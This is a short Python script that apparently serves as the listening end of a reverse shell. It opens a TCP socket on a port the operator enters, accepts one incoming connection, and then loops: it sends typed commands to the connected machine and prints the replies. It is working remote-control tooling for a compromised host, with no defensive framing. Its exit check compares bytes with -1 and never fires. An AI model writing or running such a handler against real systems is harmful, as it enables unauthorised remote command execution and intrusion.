
import socket

LPORT = int(input("Input Listening Port : "))

print(socket.gethostbyname(socket.gethostname()),"Reverse Connection Init")
rvs_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
rvs_server.bind(((socket.gethostbyname(socket.gethostname()), LPORT)))
rvs_server.listen(1)

conn, addr = rvs_server.accept()
print("Client Connect ", addr)

while True:
    cmd = (input(">> ")+"\n").encode('ascii')

    if cmd == -1:
        conn.close()
        exit(0)

    conn.sendall(cmd)
    print(conn.recv(4096))
